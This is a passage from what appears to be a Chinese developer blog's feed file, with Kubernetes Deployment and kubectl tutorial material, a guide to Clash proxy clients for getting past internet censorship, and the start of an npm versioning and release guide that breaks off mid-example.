定义容器，可以多个</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">node-app</span> <span class="comment"># 容器名字</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">ccr.ccs.tencentyun.com/k8s-tutorial/test-k8s:v1</span> <span class="comment"># 镜像</span></span><br></pre></td></tr></table></figure><p>使用指令部署该文件：<code>kubectl apply -f ./deployment.yaml</code></p><p>创建完成后查看创建的 pod：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="line">test-deployment-977f5477d-9zsv9        1/1     Running   0          13s</span><br><span class="line">test-deployment-977f5477d-wm6c6        1/1     Running   0          13s</span><br></pre></td></tr></table></figure><p>使用 label 的作用是可以定位到所创建的多个 pod 中部署的某一应用：</p><p><img src="https://s2.loli.net/2022/08/14/YfUhxKRzv2AjZ7i.png" alt=""></p><p>可以使用 <code>kubectl get deployment</code> 来查看通过 Deployment 方式部署的服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME              READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">test-deployment   2/2     2            2           0s</span><br></pre></td></tr></table></figure><p>在此，关于工作负载的类型，k8s 中有以下几个类型定义：</p><ul><li>Deployment<br>适合无状态应用，所有pod等价，可替代</li><li>StatefulSet<br>有状态的应用，适合数据库这种类型。</li><li>DaemonSet<br>在每个节点上跑一个 Pod，可以用来做节点监控、节点日志收集等</li><li>Job &amp; CronJob<br>Job 用来表达的是一次性的任务，而 CronJob 会根据其时间规划反复运行。</li></ul><p><a href="https://kubernetes.io/zh/docs/concepts/workloads/">文档</a></p><h2 id="2-4-更新或回滚-pod"><a href="#2-4-更新或回滚-pod" class="headerlink" title="2.4 更新或回滚 pod"></a>2.4 更新或回滚 pod</h2><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>如果需要更新 pod，则只需要修改 deployment 文件的信息，然后再执行 <code>kubectl apply -f ./deployment.yaml</code> 指令对 pod 重新部署，k8s 就会自动将所有的 pod 更新为最新的版本。</p><blockquote><p>在这一过程中，k8s 会逐个将 pod 销毁然后再重新创建，以保证线上服务不会被中断。</p></blockquote><p>此外还可以使用命令行来直接更新 pod 中的某个应用的镜像源：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">set</span> image deployment &lt;deployment name&gt; &lt;container name&gt;=&lt;image&gt; --record</span><br></pre></td></tr></table></figure><blockquote><p><code>--record</code> 可以将这次操作写入历史记录，方便后续回滚</p></blockquote><p>如果在修改的过程中你需要执行多个操作，但你并不想每执行一个操作都重新部署一遍，那么可以使用 <code>kubectl rollout pause deployment &lt;deployment name&gt;</code> 指令先暂停部署，修改完成后再使用 <code>kubectl rollout resume deployment &lt;deployment name&gt;</code> 恢复部署。</p><p>更新完成后如果你想要获取一份最新的 deployment yaml 文件，可以执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get deployment &lt;deployment name&gt; -o yaml &gt;&gt; new.yaml</span><br></pre></td></tr></table></figure><h3 id="回滚"><a href="#回滚" class="headerlink" title="回滚"></a>回滚</h3><p>如果应用在更新后出现了问题，我们需要回滚 pod，则只需执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl rollout undo deployment &lt;deployment name&gt; [--to-reversion=&lt;reversion&gt;]</span><br></pre></td></tr></table></figure><blockquote><p>–to-reversion 可以指定回滚到具体哪个版本，如果不加则自动回滚到上一版本</p></blockquote><p>如果需要查看所有的历史记录，则可以使用该指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl rollout <span class="built_in">history</span> deployment &lt;deployment name&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deployment.apps/test-deployment </span><br><span class="line">REVISION  CHANGE-CAUSE</span><br><span class="line">1         &lt;none&gt;</span><br><span class="line">2         &lt;none&gt;</span><br><span class="line">3         &lt;none&gt; # 如果是通过修改 deployment 文件来更新的话是不会留下历史记录的</span><br></pre></td></tr></table></figure><h2 id="2-5-关于-pod-的其他指令"><a href="#2-5-关于-pod-的其他指令" class="headerlink" title="2.5 关于 pod 的其他指令"></a>2.5 关于 pod 的其他指令</h2><ul><li><code>kubectl get all</code> 查看所有信息</li><li><code>kubectl describe pod &lt;pod name&gt;</code> 可以查看单个 pod 的详细信息</li><li><code>kubectl logs [pod/]&lt;pod name&gt; -c &lt;container name&gt; -f</code> 查看单个 pod 的日志<ul><li>如果 pod 中只有一个容器应用，则不需要指定容器</li></ul></li><li><code>kubectl exec -it [pod/]&lt;pod name&gt; -c &lt;container name&gt;</code> 进入到某个 pod 的容器中<ul><li>如果 pod 中只有一个容器应用，则不需要指定容器</li></ul></li><li><code>kubectl scale deployment &lt;deployment name&gt; --replicas=&lt;pod count&gt;</code> 修改某个部署的 pod 数量<ul><li>如果指定的新的 pod 数量大于当前的数量，这是一个扩展行为，原有已创建的 pod 还会仍会存在，并不会被销毁</li><li>如果指定的新的 pod 数量小于当前的数量，这是一个削减行为，会删除掉部分已有的 pod</li></ul></li><li><code>kubectl rollout restart deployment &lt;delpyment name&gt;</code> 重新部署某个服务</li><li><code>kubectl delete pod &lt;pod name&gt;</code>  删除某个 pod，但这个 pod 如果是某个部署的 pod，则会在删除之后重新生成一个</li><li><code>kubectl delete deployment &lt;deployment name&gt;</code>  删除某个部署</li><li><code>kubectl delete all --all</code> 删除全部资源</li><li><code>kubectl port-forward &lt;pod name&gt; &lt;target port&gt;:&lt;container port&gt;</code> 通过端口映射方式访问到指定 pod 中的端口</li></ul><blockquote><p>更多官网关于 <a href="https://kubernetes.io/zh/docs/concepts/workloads/controllers/deployment/">Deployment</a> 的介绍</p></blockquote><h2 id="2-6-将-Pod-指定到某个节点运行"><a href="#2-6-将-Pod-指定到某个节点运行" class="headerlink" title="2.6 将 Pod 指定到某个节点运行"></a>2.6 将 Pod 指定到某个节点运行</h2><p>将 Pod 指定到某个节点运行：<a href="https://kubernetes.io/zh/docs/concepts/scheduling-eviction/assign-pod-node/#nodeselector">nodeselector</a><br>限定 CPU、内存总量：<a href="https://kubernetes.io/zh/docs/concepts/policy/resource-quotas/#%E8%AE%A1%E7%AE%97%E8%B5%84%E6%BA%90%E9%85%8D%E9%A2%9D">文档</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">env:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">  <span class="attr">nodeSelector:</span></span><br><span class="line">    <span class="attr">disktype:</span> <span class="string">ssd</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CICD </category>
          
          <category> K8S </category>
          
      </categories>
      
      
        <tags>
            
            <tag> K8S </tag>
            
            <tag> 快速入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash 使用教程</title>
      <link href="/2022/08/fe708f05110a.html"/>
      <url>/2022/08/fe708f05110a.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-原理篇"><a href="#1-原理篇" class="headerlink" title="1. 原理篇"></a>1. 原理篇</h1><h2 id="1-1-Clash-是个啥"><a href="#1-1-Clash-是个啥" class="headerlink" title="1.1 Clash 是个啥"></a>1.1 Clash 是个啥</h2><p>Clash 是一个多平台的、支持 v2ray 的<strong>代理转发客户端</strong>，它可以将你设备的网络请求<strong>按照一定的规则</strong>转发到代 <code>理服务器上</code>。</p><h2 id="1-2-什么叫代理转发"><a href="#1-2-什么叫代理转发" class="headerlink" title="1.2 什么叫代理转发"></a>1.2 什么叫代理转发</h2><p>正常情况下，你的设备访问一个网络服务，是从设备直接发起的网络请求。</p><p><img src="https://s2.loli.net/2022/08/02/95qkp7yM8b6QNAW.png" alt=""></p><p>代理转发就是在你和目标服务器之间又架设了一个额外的服务器，称之为 <code>代理服务器</code> ，你的网络请求会经过这个 <code>代理服务器</code>，它会帮你传达请求数据并返回你想要的数据。</p><p><img src="https://s2.loli.net/2022/08/02/TFV3q1tNw8J7ngY.png" alt=""></p><h2 id="1-3-代理转发怎么实现科学上网"><a href="#1-3-代理转发怎么实现科学上网" class="headerlink" title="1.3 代理转发怎么实现科学上网"></a>1.3 代理转发怎么实现科学上网</h2><p>以 Google 为例，当你正常访问 Google 时，请求会被 GFW 识别，并进行拦截，因此导致你无法正常访问 Google。</p><p><img src="https://s2.loli.net/2022/08/02/3zx5u2gDKBAvqnQ.png" alt=""></p><p>但是如果你的流量不是直接访问的，而是先访问没有被 GFW 屏蔽的国外（或国内部分地区）的 <code>代理服务器</code>，再由位于国外（或国内部分地区）的 <code>代理服务器</code> 对你的流量进行转发，这样就能绕过 GFW，从而正常访问 Google。</p><p><img src="https://s2.loli.net/2022/08/02/ATvZOEyLJjHdiSr.png" alt=""></p><blockquote><p>这些 <code>代理服务器</code> 在 Clash 中被称作为 <code>节点</code> 。</p></blockquote><h2 id="1-4-什么是-Clash-订阅"><a href="#1-4-什么是-Clash-订阅" class="headerlink" title="1.4 什么是 Clash 订阅"></a>1.4 什么是 Clash 订阅</h2><p><code>订阅</code> 就是群公告里发的链接，Clash 可以读取该订阅链接并下载对应的配置，其包含了 Clash 的代理规则以及代理服务器（服务器节点）点的信息。</p><p>Clash 的订阅链接<strong>绝对不能泄露</strong>，否则就会被别人白嫖代理服务器代理，甚至服务器会遭受攻击或被 GFW 封禁。</p><h1 id="2-软件安装"><a href="#2-软件安装" class="headerlink" title="2. 软件安装"></a>2. 软件安装</h1><p>由于 <a href="https://github.com/Dreamacro/clash">Clash</a> 作者更新不力，对于使用了新协议（如 vless）的节点，无法进行支持，因此社区退出了基于 Clash 改版的 <a href="https://github.com/MetaCubeX/Clash.Meta">Clash.Meta</a> 内核，以提供更多的节点协议支持，因此现阶段（2023.5.19 推荐使用支持 Clash.Meta 内核的客户端）。</p><blockquote><p>这里说明以下为什么要使用新协议，在2023年10月3日出现了大批量节点被封禁的情况，据传言网络审查者借助大数据与人工智能的手段，<strong>已经能够精确识别到当前用户是否正在采用非法手段使用网络（如使用 vmess 协议的节点）</strong>，因此社区对于旧有的基于 tls in tls 伪装思路究竟是否安全产生了很多质疑声。</p></blockquote><blockquote><p>然而旧协议的代表 vmess 的作者已经退出，ProjectV 项目也已经被废弃，一艘大船已经几近沉没，于是更多人参与到了 ProjectX，搭建一艘新的巨轮。ProjectX 推出了更多的协议类型，如效率更高的 vless+xtls ，2023年1月9日还推出了隐蔽性更高的 reality 协议，至此 reality 协议被视为一种更好的解决方案。</p></blockquote><h2 id="2-1-Windows-MacOS-客户端"><a href="#2-1-Windows-MacOS-客户端" class="headerlink" title="2.1 Windows/MacOS 客户端"></a>2.1 Windows/MacOS 客户端</h2><h4 id="Clash-for-Windows-（不再推荐使用，建议下载下面的-clash-verge）"><a href="#Clash-for-Windows-（不再推荐使用，建议下载下面的-clash-verge）" class="headerlink" title="Clash for Windows （不再推荐使用，建议下载下面的 clash-verge）"></a>Clash for Windows （不再推荐使用，建议下载下面的 clash-verge）</h4><p><a href="https://github.com/Fndroid/clash_for_windows_pkg/releases">下载地址</a></p><p><img src="https://s2.loli.net/2022/08/02/B8LcF7dpPEMGz1S.png" alt=""></p><h4 id="clash-verge"><a href="#clash-verge" class="headerlink" title="clash-verge"></a>clash-verge</h4><blockquote><p>clash 与 clash.meta 双内核，支持使用 reality 节点</p></blockquote><p><a href="https://github.com/zzzgydi/clash-verge/releases">下载地址</a></p><p>版本下载说明与上面一致，不再添加截图。</p><h2 id="2-2-Android-客户端"><a href="#2-2-Android-客户端" class="headerlink" title="2.2 Android 客户端"></a>2.2 Android 客户端</h2><h4 id="ClashFroAndroid（不再推荐使用，建议下载下面的-ClashMetaForAndroid）"><a href="#ClashFroAndroid（不再推荐使用，建议下载下面的-ClashMetaForAndroid）" class="headerlink" title="ClashFroAndroid（不再推荐使用，建议下载下面的 ClashMetaForAndroid）"></a>ClashFroAndroid（不再推荐使用，建议下载下面的 ClashMetaForAndroid）</h4><p>如果可以使用 Google Play，优先在 Google Play 上下载发行版本，<a href="https://play.google.com/store/apps/details?id=com.github.kr328.clash">下载地址</a></p><p>如果无法访问 Google Paly，从 Github 下载，<a href="https://github.com/Kr328/ClashForAndroid/releases">Clash for Android 下载地址</a></p><p><img src="https://s2.loli.net/2022/08/02/kLfzv24TcylutIK.png" alt=""></p><h4 id="ClashMetaForAndroid【支持-reality-节点】"><a href="#ClashMetaForAndroid【支持-reality-节点】" class="headerlink" title="ClashMetaForAndroid【支持 reality 节点】"></a>ClashMetaForAndroid【支持 reality 节点】</h4><p><a href="https://github.com/MetaCubeX/ClashMetaForAndroid/releases">下载地址</a></p><p>版本下载说明与上面一致，不再添加截图。</p><h2 id="2-3-IOS"><a href="#2-3-IOS" class="headerlink" title="2.3 IOS"></a>2.3 IOS</h2><h4 id="Stash（不支持-Reality-节点，暂不推荐）"><a href="#Stash（不支持-Reality-节点，暂不推荐）" class="headerlink" title="Stash（不支持 Reality 节点，暂不推荐）"></a>Stash（不支持 Reality 节点，暂不推荐）</h4><p>注册美区账号，APP Store 搜索 Stash 并购买下载（不能使用国内信用卡，需要买礼品卡兑换，自行 Google 关键词 『Stash 兑换码』，30RMB左右，也可以直接购买成品号）</p><p>下载时认准 app 图标和开发者：</p><p><img src="https://s2.loli.net/2023/03/30/bFnDBpZ8mrwdJVv.jpg" alt=""></p><h4 id="ShadowRocket"><a href="#ShadowRocket" class="headerlink" title="ShadowRocket"></a>ShadowRocket</h4><p><del>更新速度更快，但是不支持直接复用 clash 的规则，如果不会折腾还是只推荐使用 stash</del></p><blockquote><p>目前在 iOS 上使用 Reality 节点订阅的方式只有 ShadowRocket</p></blockquote><p>注册美区账号，APP Store 搜索 ShadowRocket 并购买下载。</p><h1 id="3-使用"><a href="#3-使用" class="headerlink" title="3. 使用"></a>3. 使用</h1><h2 id="3-1-Clash-for-Windows（无论使用哪个软件，先看这个软件的使用方法）"><a href="#3-1-Clash-for-Windows（无论使用哪个软件，先看这个软件的使用方法）" class="headerlink" title="3.1 Clash for Windows（无论使用哪个软件，先看这个软件的使用方法）"></a>3.1 Clash for Windows（无论使用哪个软件，先看这个软件的使用方法）</h2><h3 id="订阅的下载与更新"><a href="#订阅的下载与更新" class="headerlink" title="订阅的下载与更新"></a>订阅的下载与更新</h3><p><img src="https://s2.loli.net/2022/08/02/U8my16PI5vX4oMK.png" alt=""></p><h3 id="Proxies-面板"><a href="#Proxies-面板" class="headerlink" title="Proxies 面板"></a>Proxies 面板</h3><h4 id="Rule-规则模式"><a href="#Rule-规则模式" class="headerlink" title="Rule 规则模式"></a>Rule 规则模式</h4><p><strong>一般默认使用的代理模式</strong>，在这个模式下，所有流量都会按照制定的规则进行转发，比如国内流量不转发，国外流量再进行转发，这样就可以尽可能的节省代理服务器的流量，同时保证国内服务能够正常访问，以下为部分规则的说明与示例。</p><p>节点选择与自动选择：</p><p><img src="https://s2.loli.net/2022/08/02/R7njxksUNdYrXE8.png" alt=""></p><p>其他规则：</p><p><img src="https://s2.loli.net/2022/08/02/D4z5sgxmZl8CIAk.png" alt=""></p><p>举例，如果你想看 B 站港区番剧，你可以手动调整规则列表中的『Bilibili』为香港节点（看完之后记得切回直连，否则浪费带宽，自己速度还慢，相当于从国外绕回国内）：</p><p><img src="https://s2.loli.net/2022/08/02/BjMDuXNqstx1vCS.png" alt=""></p><h4 id="Global-全局模式"><a href="#Global-全局模式" class="headerlink" title="Global 全局模式"></a>Global 全局模式</h4><p>如果在 『Rule』规则模式下仍有些国外网站无法访问，你可以选择『Global』全局模式：</p><p><img src="https://s2.loli.net/2022/08/02/FIyw94MsuZ2kC5L.png" alt=""></p><p>在这个模式下，你设备的所有流量都会经过你选中的服务器节点（如上图，所有流量都会转发到韩国节点上）。因此全局模式下会消耗大量代理服务器流量，除非特殊情况，否则不要开启。</p><h4 id="Direct-直连模式"><a href="#Direct-直连模式" class="headerlink" title="Direct 直连模式"></a>Direct 直连模式</h4><p>与全局模式相反，如果你发现某些国内网站无法正常访问，就可以选择『Direct』直连模式，这个模式下会临时禁用所有的流量转发，等同于你关闭了 Clash。</p><p><img src="https://s2.loli.net/2022/08/02/PgDdBcAQ2YnNrlh.png" alt=""></p><h3 id="General-面板"><a href="#General-面板" class="headerlink" title="General 面板"></a>General 面板</h3><p>General 面板是 Clash for Windows 独有的，一般不用调整。</p><p><img src="https://s2.loli.net/2022/08/02/CnAoa7tdsrDgzkJ.png" alt=""></p><p><strong>[这段是写给程序员的]</strong> Port 是代理服务器的端口，一般如果勾选了『System Proxy』，软件就会自动走代理服务器的端口，如果你需要让终端使用 Clash，则按照终端设置代理的方式将代理指向该端口就可以。</p><p>单独介绍一下 TUN Mode，TUN Mode 是 Clash for Windows 独有的模式，在非 TUN Mode 模式下，所有的流量只是通过『系统代理』的方式进行代理转发，某些不支持系统代理的软件就无法走 Clash 的代理了，但是在 TUN Mode 下，Clash 会创建一张虚拟网卡，让所有这样就能接管所有的系统流量。举个例子：一般来说游戏的数据包由于走的是 UDP，因此并不会被 Clash 进行转发，但是在 TUN Mode 下，游戏数据包就可以被 Clash 进行转发，因此在 TUN Mode 下，Clash 可以起到游戏加速器的作用。</p><h2 id="3-2-clash-verge"><a href="#3-2-clash-verge" class="headerlink" title="3.2 clash-verge"></a>3.2 clash-verge</h2><p>切换中文：</p><p><img src="https://s2.loli.net/2023/05/19/2gbI6PoX5BDqaJQ.png" alt=""></p><p>切换为 Meta 内核，并启用系统代理与开机自启：</p><p><img src="https://s2.loli.net/2023/05/19/xoJyAZ4l9iXgHKc.png" alt=""></p><blockquote><p>其他操作与 Clash for Windows 一致，不再赘述</p></blockquote><h2 id="3-3-ClashForAndroid"><a href="#3-3-ClashForAndroid" class="headerlink" title="3.3 ClashForAndroid"></a>3.3 ClashForAndroid</h2><p><img src="https://s2.loli.net/2022/08/02/H5Vj23ziYOqbZka.jpg" alt=""></p><blockquote><p>代理规则与 Clash for Windows 相同，不再赘述</p></blockquote><h2 id="3-3-ClashMetaForAndroid"><a href="#3-3-ClashMetaForAndroid" class="headerlink" title="3.3 ClashMetaForAndroid"></a>3.3 ClashMetaForAndroid</h2><p>与 ClashForAndroid 界面和操作一致，不再赘述</p><h2 id="3-5-Stash"><a href="#3-5-Stash" class="headerlink" title="3.5 Stash"></a>3.5 Stash</h2><p><img src="https://s2.loli.net/2023/03/30/DU2hXSufmpgVJtN.jpg" alt=""></p><blockquote><p>代理规则与 Clash for Windows 相同，不在赘述</p></blockquote><h2 id="3-6-ShadowRocket"><a href="#3-6-ShadowRocket" class="headerlink" title="3.6 ShadowRocket"></a>3.6 ShadowRocket</h2><p>进入 APP 后依次添加订阅，选择节点，开启代理：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403271912750.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>npm 标准化发包方案调研</title>
      <link href="/2022/07/260a67a12b03.html"/>
      <url>/2022/07/260a67a12b03.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-传统的发包模式"><a href="#1-传统的发包模式" class="headerlink" title="1. 传统的发包模式"></a>1. 传统的发包模式</h1><h2 id="1-1-版本发布"><a href="#1-1-版本发布" class="headerlink" title="1.1 版本发布"></a>1.1 版本发布</h2><p>传统的发包模式指用户在本地进行发包、版本升级的操作，因此所有的 cli 都是在本地执行。当我们写好一个 npm package 之后，并且登录好 npm 后，就可以执行以下指令直接发布第一版：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish --access public</span><br></pre></td></tr></table></figure><h2 id="1-2-版本迭代"><a href="#1-2-版本迭代" class="headerlink" title="1.2 版本迭代"></a>1.2 版本迭代</h2><p>当进行了一些变更之后，可以手动去变更 <code>package.json</code> 的版本号，当然这是一种非常低效且不优雅的做法，<strong>手动变更版本号存在太多不确定的因素</strong>，比如改错版本号或跳过某个版本号；同时，一般我们在生成一个新的版本后要打一个 tag 对当前版本进行留档，纯手动操作的话会有很多的工作量。因此我们需要一个更加『靠谱』的迭代版本号的方案。</p><h3 id="1-2-1-npm-版本规范"><a href="#1-2-1-npm-版本规范" class="headerlink" title="1.2.1 npm 版本规范"></a>1.2.1 npm 版本规范</h3><p>在谈论如何优雅的进行迭代版本号之前，我们先来了解一下 npm 采用的<a href="https://docs.npmjs.com/about-semantic-versioning">语义化版本号</a>：</p><p>npm 的语义化版本，共三位，以’.’隔开，从左至右依次代表：</p><ul><li>主版本（major）</li><li>次要版本（minor）</li><li>补丁版本（patch）</li></ul><p>举例来说：1(major).0(minor).0(patch)</p><p>当然有时某些包还存在预览版本，预览版本的版本号要与前三位版本号使用 <code>-</code> 进行间隔，如：</p><ul><li>1.0.0-1</li><li>1.0.0-alpha.1</li><li>1.0.0-beta.1</li><li>1.0.0-rc.1</li></ul><blockquote><p><code>alhpa</code> / <code>beta</code> / <code>rc</code> 这些并不是 npm 官方定义的 prerelease 前缀，你可以使用任何前缀，甚至 <code>niconiconi</code>，如何添加这些前缀，我们后面会讨论到。</p></blockquote><p>对于版本变更的规范，推荐采用以下策略：</p><table><thead><tr><th>代码状态</th><th>等级</th><th>规则</th><th>版本样例</th></tr></thead><tbody><tr><td>首次发布</td><td>新品发布</td><td>以1.0.0开始</td><td>1.0.0</td></tr><tr><td>bug 修复，向后兼容</td><td>补丁版本发布</td><td>变更第三位数字</td><td>1.0.1</td></tr><tr><td>新功能，向后兼容</td><td>次版本发布</td><td>变更第二位数字，并且第三位数字重置为 0</td><td>1.1.0</td></tr><tr><td>重大变更，不向后兼容</td><td>主版本发布</td><td>变更第一位数字，并且第二位和第三位数字重置为 0</td><td>2.0.0</td></tr></tbody></table><h3 id="1-2-2-使用-npm-version-变更版本号"><a href="#1-2-2-使用-npm-version-变更版本号" class="headerlink" title="1.2.2 使用 npm version 变更版本号"></a>1.2.2 使用 npm version 变更版本号</h3><p>npm 提供了 <a href="https://docs.npmjs.com/cli/v6/commands/npm-version"><code>npm version</code></a> 指令可以辅助我们来进行版本迭代，假设我们现在的版本是 <code>1.0.0</code>，使用 <code>npm version</code> 的各个参数进行版本升级，得到的结果如下：</p><p>对于一般的迭代，使用 <code>major</code> / <code>minor</code> / <code>patch</code> 即可：</p><ul><li>npm version major =&gt; 2.0.0</li><li>npm version minor =&gt; 1.1.0</li><li>npm version patch =&gt; 1.0.1</li></ul><p>如果你要发布预览版本（prerelease）的 package，你可以使用 <code>premajor</code> / <code>preminor</code> / <code>prepatch</code> 并结合 <code>prerelease</code> 来升级预览版本号：</p><ul><li>npm version premajor =&gt; 2.0.0-0 <code>发型一版重大变更预览版本的 package</code><ul><li>npm version prerelease =&gt; 2.0.0-1 <code>增加当前预览版本的版本号</code><ul><li>npm version major =&gt; 2.0.0 <code>正式发布</code></li></ul></li></ul></li><li>npm version preminor =&gt; 1.1.0-0<ul><li>npm version prerelease =&gt; 1.1.0-1<ul><li>npm version minor =&gt; 1.1.0</li></ul></li></ul></li><li>npm version prepatch =&gt; 1.0.1-0<ul><li>npm version prerelease =&gt; 1.0.1-1<ul><li>npm version patch =&gt; 1.0.1</li></ul></li></ul></li></ul><p>如果你想为预览版的版本号添加 <code>alpha</code> / <code>beta</code> 这样的前缀的话，可以使用 <code>--preid</code> 参数，我们依旧以 <code>1.0.0</code>  为初始版本，使用 <code>npm version</code> 进行预览版的版本变更示例如下：</p><ul><li>npm version prepatch –preid alpha =&gt; 1.0.1-alpha.0<ul><li>npm version prerelease  =&gt; 1.0.1-alpha.1<ul><li>npm version patch –preid alpha =&gt; 1.0.1 <code>⚠️ 如果要发布当前 preid 的正式版，执行正式版并发布指令时需要后缀 --preid 参数</code></li><li>npm version patch =&gt; 1.0.2 <code>如果不后缀就会直接迭代到下一版本</code></li><li>npm version prepatch –preid beta =&gt; 1.0.2-beta.1 <code>如果切换了 preid 就会重新生成一个新版本，而不是在当前版本迭代版本号</code></li></ul></li></ul></li></ul><p>需要注意的是，当你执行 <code>npm version</code> 指令时，<strong>当前的工作区必须是干净的</strong>，否则会执行失败；且当执行成功后，会自动生成一个 commit（commit message 默认为版本号），<strong>同时在这次自动生成的 commit 上打一个 tag</strong>，tag 名称即为以 <code>v</code> 开头的版本号名称，如果你想修改默认的 commit message，你可以使用如下指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm version patch -m <span class="string">&quot;Release version %s&quot;</span> <span class="comment"># 『%s』代表当前版本号</span></span><br></pre></td></tr></table></figure><p>此外，对于你发布的 prerelease 版本的 package 需要注意以下两点：</p><ol><li>当用户进行首次安装你的包时，且此时你的包最新的版本为一个 prerelease 版本，那么用户就会安装这个 prerelease 版本；如果用户只想安装稳定版，那么可以通过 <code>npm install xxx@version</code>，比如 <code>npm install xxx@1</code> 或 <code>npm install xxx@&quot;&gt;1.0.0&quot;</code> 这样的指令安装的包不会安装到 prerelease 版本。</li><li>但是，当用户当前安装的是一个正式版本的包时，使用 <code>npm update</code> 去更新你的包，是不会主动更新到 prerelease 版本的；但如果正式版用户想要升级为 prerelease 版，可以通过执行 <code>npm install package@latest</code> 来安装最新的版本（包含预览版）。</li></ol><h2 id="1-3-CHANGELOG-的生成"><a href="#1-3-CHANGELOG-的生成" class="headerlink" title="1.3 CHANGELOG 的生成"></a>1.3 CHANGELOG 的生成</h2><p>在一些项目中，会用 <code>CHANGELOG.md</code> 来标注每个版本的变更内容，这个文件通常是使用专门的工具生成的，比如 <a href="https://github.com/conventional-changelog/conventional-changelog">conventional-changelog</a>，但是自动生成的条件必须满足：</p><ol><li>使用标准的 commit 规范，通常在默认情况下使用 <a href="https://github.com/angular/angular.js/blob/master/DEVELOPERS.md#-git-commit-guidelines">Angular 的提交规范</a>，这样 <code>conventional-changelog</code> 就会知道你每次提交做了什么，是新增了一个 fetature，还是修复了一些 bug，亦或是其他。你可以使用 <code>@commitlint/cli</code> + <code>husky</code> 对你的代码进行提交检查，同时也可以使用 <code>commitizen</code> 来生成标准化的 commit，关于这些，你可以参考<a href="https://blog.esunr.site/2022/07/72bea7fe8c23.html#3-CommitLint">这篇文章</a>。</li><li>在每次生成一个新的版本后，在当前的提交上要创建一个 tag，tag 的名称为版本号，比如 <code>v1.0.0</code>，这点如果你使用 <code>npm version</code> 来生成版本号的话就无需担心这一点。</li></ol><p>一个标准的 commit 历史如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">commit xxxxxxx (tag: v1.1.0)</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">1.1.0</span><br><span class="line"></span><br><span class="line">commit xxxxxxx</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">fix: fix a bug</span><br><span class="line"></span><br><span class="line">commit xxxxxxx</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">feat: add new fetaure 2</span><br><span class="line"></span><br><span class="line">commit xxxxxxx</span><br><span class="line">Author xxx</span><br><span class="line">Date   xxx</span><br><span class="line">feat: add new fetaure 1</span><br><span class="line"></span><br><span class="line">commit 